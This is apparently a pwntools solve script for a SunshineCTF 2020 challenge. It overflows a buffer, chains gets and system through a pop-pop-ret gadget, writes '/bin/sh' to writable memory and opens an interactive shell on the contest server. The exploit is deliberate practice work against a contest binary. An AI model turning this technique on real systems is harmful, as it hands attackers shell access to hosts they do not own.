from pwn import *

e = ELF("./chall10")
p = remote("chal.2020.sunshinectf.org", 30010)

p.sendline("A")

rw = 0x804af00

log.info(f"0x{rw:02x}")

pop_pop_ret = 0x080485ea#: pop edi; pop ebp; ret;

buf = b''
buf += cyclic(cyclic_find(0x61716161))
buf += p32(e.symbols['gets'])
buf += p32(pop_pop_ret)
buf += p32(rw)
buf += p32(0x42424242)
buf += p32(e.symbols['system'])
buf += p32(0x414141)
buf += p32(rw)

p.sendline(buf)

p.sendline("/bin/sh\x00")

p.interactive()
